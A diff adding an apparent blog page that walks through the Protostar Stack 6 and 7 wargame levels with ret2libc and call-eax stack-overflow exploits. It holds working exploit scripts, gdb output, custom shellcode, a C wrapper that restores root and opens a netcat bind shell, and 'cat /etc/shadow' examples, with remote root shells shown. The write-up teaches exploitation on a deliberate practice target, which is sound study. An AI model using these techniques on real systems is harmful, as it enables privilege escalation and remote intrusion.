@@ -1,0 +1,441 @@
+
+<!DOCTYPE HTML>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>Protostar Stack Exploits (Solutions 6-7) - Louis Li</title>
+	<meta name="author" content="Louis Li">
+
+	
+	<meta name="description" content="Protostar Stack Exploits (Solutions 6-7) Overview Protostar is a series of exercises from Exploit Exercises. In addition to three final levels, it &hellip;">
+	
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+	<link href="http://feeds.feedburner.com/louisligithub" rel="alternate" title="Louis Li" type="application/atom+xml">
+	
+	<link rel="canonical" href="http://louisrli.github.io/blog/2012/08/28/protostar-stack2/">
+	<link href="/favicon.png" rel="shortcut icon">
+	<link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+	<!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+	<script src="//ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
+	<link href='http://fonts.googleapis.com/css?family=Open+Sans:400italic,400,700' rel='stylesheet' type='text/css'>
+	<!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+</head>
+
+
+<body>
+	<div class="container">
+		<div class="left-col">
+			<div class="intrude-less">
+			<header id="header" class="inner"><div class="profilepic">
+	<script src="/javascripts/md5.js"></script>
+	<script type="text/javascript">
+		$(function(){
+			$('.profilepic').append("<img src='http://www.gravatar.com/avatar/" + MD5("louisrli@gmail.com") + "?s=160' alt='Profile Picture' style='width: 160px;' />");
+		});
+	</script>
+</div>
+<hgroup>
+  <h1><a href="/">Louis Li</a></h1>
+  
+</hgroup>
+
+<p class="subtitle"></p>
+<nav id="main-nav"><ul class="main-navigation">
+  <li><a href="/blog">Blog</a></li>
+  <li><a href="/blog/2013/01/12/sideprojects-2012/">Sideprojects</a></li>
+  <li><a href="http://github.com/louisrli">Github</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+<nav id="sub-nav">
+	<div class="social">
+		
+		
+		<a class="google" href="https://plus.google.com/106125247318074050350" rel="author" title="Google+">Google+</a>
+		
+		
+		
+		<a class="github" href="https://github.com/louisrli" title="GitHub">GitHub</a>
+		
+		
+		
+		
+		
+		
+		
+		
+		<a class="rss" href="http://feeds.feedburner.com/louisligithub" title="RSS">RSS</a>
+		
+	</div>
+</nav>
+</header>				
+			</div>
+		</div>	
+		<div class="mid-col">
+			
+				
+			
+			<div class="mid-col-container">
+				<div id="content" class="inner"><article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+	<h1 class="title" itemprop="name">Protostar Stack Exploits (Solutions 6-7)</h1>
+	<div class="entry-content" itemprop="articleBody"><h1>Overview</h1>
+
+<p><strong>Protostar</strong> is a series of exercises from <a href="http://exploit-exercises.com/protostar">Exploit Exercises</a>. In addition to three final levels, it has four basic sections: network programming, format strings, heap overflows, and stack overflows.</p>
+
+<p>This series of posts contains solutions and walkthroughs for the stack overflow levels (&ldquo;Stack&rdquo;). It assumes basic knowledge of systems programming and is meant to serve as a reference for those stuck on certain levels. This is the final post for Stack.</p>
+
+<h1>Solutions</h1>
+
+<h2>Stack 6</h2>
+
+<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack6">full</a>): Execute shellcode with a restriction on the return address. This mimics a nonexecutable stack by barring any return addresses of the form <code>0xbfxxxxxx</code>.</p>
+
+<h3>Utilities</h3>
+
+<p>We&rsquo;ll add one more script to our utility belt. This will help us quickly make guesses for buffer overflows.</p>
+
+<p><code>~/try-address.sh</code>:</p>
+
+<div>
+  <pre><code class='bash'>#!/bin/bash
+# Takes an offset and unlimited 4-byte addresses and prints it in little-endian order
+if [[ $# -lt 2 ]]; then
+    echo &quot;usage: $0 OFFSET ADDRESS. Example: $0 80 0xdeadbeef 0xf00f00f0&quot;
+    exit 1
+fi
+
+perl -e &quot;print 'A'x$1&quot;
+shift
+for addr in $@; do
+    for i in $(seq 8 -2 2); do echo -ne &quot;\x${addr:$i:2}&quot;; done
+done</code></pre>
+</div>
+
+
+
+
+<!-- more -->
+
+
+<h3>Solution</h3>
+
+<p>First, we need to find the proper offset for overwriting the return address. The command below reveals that the return address is 16 bytes after the end of the 64 byte buffer, meaning that 80 bytes are needed before overwriting the return address.</p>
+
+<div>
+  <pre><code class='console'>$ for i in $(seq 76 4 100); do echo $i; ~/try-address.sh $i 0xbfffffff | ./stack6; done
+76
+...
+80
+input path please: bzzzt (0xbfffffff)
+84
+...</code></pre>
+</div>
+
+
+<p>For our solution, we&rsquo;ll be performing a <strong><a href="http://en.wikipedia.org/wiki/Return-to-libc_attack">ret2libc</a></strong> attack. <a href="http://shellblade.net/docs/ret2libc.pdf">This paper</a> by InVoLuNTaRy offers an in-depth description of the tactic (sidenote: it&rsquo;s one of the most well-written papers that I&rsquo;ve ever read and well worth the read). The rest of this section assumes that this paper has been read.</p>
+
+<p>First, we find the addresses of the <code>system()</code> and <code>exit()</code> libc functions. <code>exit()</code> isn&rsquo;t strictly necessary, but since ret2libc ultimately calls two functions, we prefer to return without a segmentation fault.</p>
+
+<div>
+  <pre><code class='console'>$ gdb -q stack6
+Reading symbols from /opt/protostar/bin/stack6...done.
+(gdb) break main
+Breakpoint 1 at 0x8048500: file stack6/stack6.c, line 27.
+(gdb) run
+Starting program: /opt/protostar/bin/stack6
+
+Breakpoint 1, main (argc=1, argv=0xbffff874) at stack6/stack6.c:27
+27      stack6/stack6.c: No such file or directory.
+in stack6/stack6.c
+(gdb) print system
+$1 = {&lt;text variable, no debug info&gt;} 0xb7ecefb0 &lt;__libc_system&gt;
+(gdb) print exit
+$2 = {&lt;text variable, no debug info&gt;} 0xb7ec50c0 &lt;*__GI_exit&gt;</code></pre>
+</div>
+
+
+<p>We see that our functions have the following addresses:</p>
+
+<ul>
+<li><code>system()</code>: <code>0xb7ecefb0</code></li>
+<li><code>exit()</code>: <code>0xb7ec50c0</code></li>
+</ul>
+
+
+<p>Given the particular stack layout for a ret2libc attack (described in the InVoLuNTaRy paper), our solution will be of the form:</p>
+
+<div>
+  <pre><code class='console'>$ ~/try-address.sh 80 (ENV_VAR_ADDRESS) (EXIT()_ADDRESS) (SYSTEM()_ADDRESS)</code></pre>
+</div>
+
+
+<h4>Sanity checks</h4>
+
+<p>First, let&rsquo;s make sure that we can actually execute code.</p>
+
+<div>
+  <pre><code class='console'>$ export TEST=whoami
+$ /home/user/try-address.sh 80 0xb7ecefb0 0xb7ec50c0 0xbfffff8a | ./stack6
+input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��AAAAAAAAAAAA���P췊���
+sh: =whoami: not found
+$ /home/user/try-address.sh 80 0xb7ecefb0 0xb7ec50c0 0xbfffff8b | ./stack6
+input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��AAAAAAAAAAAA���P췋���
+root</code></pre>
+</div>
+
+
+<h4>Working netcat solution</h4>
+
+<p>There are two obstacles to a working solution.</p>
+
+<ol>
+<li>Environmental variables with spaces don&rsquo;t work. All of the following would fail:</li>
+</ol>
+
+
+<div>
+  <pre><code class='console'>$ export RUN=&quot;nc -lp8080 -e/bin/sh&quot;
+$ export RUN=&quot;cat /etc/shadow&quot;
+$ export RUN=&quot;\&quot;cat /etc/shadow\&quot;&quot;</code></pre>
+</div>
+
+
+<ol>
+<li><code>system()</code> will drop our root privileges (<a href="http://linux.die.net/man/3/system">man system</a>)</li>
+</ol>
+
+
+<p>Instead, we can wrap our call to netcat in another C program, naming an executable without spaces and restoring our privileges.</p>
+
+<div>
+  <pre><code class='c'>#include &lt;stdlib.h&gt;
+
+int main(int argc, char **argv, char **envp) {
+    setuid(0); // These two are necessary, as system() drops privileges
+    setgid(0);
+    char *args[] = {  &quot;nc&quot;, &quot;-lp8080&quot;, &quot;-e/bin/sh&quot;, (char *) 0 };
+    execve(&quot;/bin/nc&quot;, args, envp);
+}</code></pre>
+</div>
+
+
+
+
+<div>
+  <pre><code class='console'>$ gcc ~/netcat.c -o ~/netcat
+$ export RUN=/////////////////////////////////////home/user/netcat   # The slashes are similar to a NOP sled
+$ ~/envaddr RUN
+RUN is at address 0xbfffff9e
+$ /home/user/try-address.sh 80 0xb7ecefb0 0xb7ec50c0 0xbfffff9e | ./stack6
+input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��AAAAAAAAAAAA���P췞���
+sh: 192.168.1.10: not found</code></pre>
+</div>
+
+
+<p><code>system()</code> doesn&rsquo;t seem to be using the contents of our environmental variable. If we look at the environmental variables, though, we see that we were close enough: <code>RUN</code> is the next variable. We then adjust our estimate for the address of <code>RUN</code> by 20 bytes.</p>
+
+<div>
+  <pre><code class='console'>$ env
+...
+HOME=/home/user
+LOGNAME=user
+SSH_CONNECTION=192.168.1.7 49324 192.168.1.10 22
+RUN=/////////////////////////////////////home/user/netcat
+_=/usr/bin/env
+$ /home/user/try-address.sh 80 0xb7ecefb0 0xb7ec50c0 0xbfffffbe | ./stack6
+input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��AAAAAAAAAAAA���P췳���
+&lt;waiting&gt;</code></pre>
+</div>
+
+
+<p>Finally, through a remote machine:</p>
+
+<div>
+  <pre><code class='console'>$[louis@neutrino ~]$ nc 192.168.1.10 8080
+whoami
+root</code></pre>
+</div>
+
+
+<h2>Stack: Level 7</h2>
+
+<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack7">full</a>): Execute shellcode with further restrictions on the return address. Any address of the form <code>0xbxxxxxxx</code> raises an error.</p>
+
+<h3>Overview</h3>
+
+<p>The return value of a function is usually stored in the <code>eax</code> register. The key to this level is the call to <code>return strdup(buf)</code>: this means we can find the buffer (e.g. our shellcode) in the <code>eax</code> register when <code>getpath()</code> returns.</p>
+
+<p>The code restricts us from returning to any code on the bottom of the stack (<code>0xbxxxxxxx</code>) and advises us to return to the <code>.text</code> section. In particular, we&rsquo;ll want to return to a <code>call eax</code> instruction, which will then call our shellcode.</p>
+
+<div>
+  <pre><code class='console'>$ objdump -M intel -d stack7 | grep &quot;call.*eax&quot;
+8048478:       ff 14 85 5c 96 04 08    call   DWORD PTR [eax*4+0x804965c]
+80484bf:       ff d0                   call   eax
+80485eb:       ff d0                   call   eax</code></pre>
+</div>
+
+
+<p>If we play with the numbers like in earlier levels, we&rsquo;ll find that 80 bytes are needed before the return address. Our buffer overflow will look like this:</p>
+
+<div>
+  <pre><code class='text'>Buffer start
+      | ---------- Shellcode (n bytes) --------- |
+      | -------- Padding (80 - n bytes) -------- |
+      | -- Return address 0x80484bf (4 bytes) -- |
+Buffer end (84 bytes total)</code></pre>
+</div>
+
+
+<h3>Solution</h3>
+
+<p>In earlier levels, we found that opening a shell with <code>gets()</code>. However, we can still use it to validate our strategy:</p>
+
+<div>
+  <pre><code class='console'>$ echo -ne $(cat ~/shell)$(~/try-address.sh 49 0x080484bf) | wc -c
+84
+$ echo -ne $(cat ~/shell)$(~/try-address.sh 49 0x080484bf) &gt; /tmp/stack7shell
+$ gdb -q stack7
+Reading symbols from /opt/protostar/bin/stack7...done.
+(gdb) run &lt; /tmp/stack7shell
+Starting program: /opt/protostar/bin/stack7 &lt; /tmp/stack7shell
+input path please: got path ����1�Ph//shh/bin��h-ilsP�̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAA�AAAAAAAAAAAA��
+Executing new program: /bin/dash
+
+Program exited normally.</code></pre>
+</div>
+
+
+<p>If we give it a shot with our <code>nc</code> shellcode, we&rsquo;ll find the following error: <code>bin/sh: forward host lookup failed: Unknown host</code>. This occurs as a complication from having options passed into the <code>execve</code> call.</p>
+
+<p>We can add another wrapper to the <code>netcat.c</code> used in Level 6 by writing our own shellcode. This shellcode will simply execute <code>/tmp/nc</code>, an alias for a compiled <code>netcat.c</code>. This file, in turn, calls netcat and listens via port 8080.</p>
+
+<p><code>~/sc-tmp-nc.asm</code>:</p>
+
+<div>
+  <pre><code class='nasm'>BITS 32
+
+xor eax, eax
+push eax
+push 0x636e2f2f         ; //nc
+push 0x706d742f         ; /tmp
+mov ebx, esp
+push eax
+mov edx, esp
+push ebx
+mov ecx, esp
+mov al, 11              ; execve()
+int 0x80</code></pre>
+</div>
+
+
+
+
+<div>
+  <pre><code class='console'>$ nasm ~/sc-tmp-nc.asm
+$ gcc ~/netcat.c -o ~/netcat
+$ cp /home/user/netcat /tmp/nc
+$ cat /home/user/sc-tmp-nc | wc -c
+25
+got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��
+$ echo -ne $(cat ~/sc-tmp-nc)$(~/try-address.sh 55 0x080484bf) | ./stack7
+input path please: got path 1�Ph//nch/tmp���̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�AAAAAAAAAAAA��
+&lt;waiting&gt;</code></pre>
+</div>
+
+
+<p>On a remote machine:</p>
+
+<div>
+  <pre><code class='console'>$[louis@neutrino ~]$ nc 192.168.1.10 8080
+whoami
+root</code></pre>
+</div>
+
+
+
+</div>
+
+</article>
+
+	<div class="share">
+	<div class="addthis_toolbox addthis_default_style ">
+	
+	
+	<a class="addthis_button_tweet"></a>
+	
+	
+	<a class="addthis_counter addthis_pill_style"></a>
+	</div>
+  <script type="text/javascript" src="http://s7.addthis.com/js/250/addthis_widget.js#pubid="></script>
+</div>
+
+
+
+<section id="comment">
+    <h1 class="title">Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+</section>
+</div>
+			</div>
+			<footer id="footer" class="inner"><p>
+  Copyright &copy; 2013 - Louis Li -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+Design credit: <a href="http://shashankmehta.in/archive/2012/greyshade.html">Shashank Mehta</a></footer>
+			<script src="/javascripts/slash.js"></script>
+<script src="/javascripts/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+	$('.fancybox').fancybox();
+})(jQuery);
+</script> <!-- Delete or comment this line to disable Fancybox -->
+
+
+<script type="text/javascript">
+      var disqus_shortname = 'louisrli';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://louisrli.github.io/blog/2012/08/28/protostar-stack2/';
+        var disqus_url = 'http://louisrli.github.io/blog/2012/08/28/protostar-stack2/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = 'http://' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+	<script type="text/javascript">
+		var _gaq = _gaq || [];
+		_gaq.push(['_setAccount', 'UA-32823730-1']);
+		_gaq.push(['_trackPageview']);
+
+		(function() {
+			var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+			ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+			var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+		})();
+	</script>
+
+
+
+
+		</div>
+	</div>
+</body>
+</html>
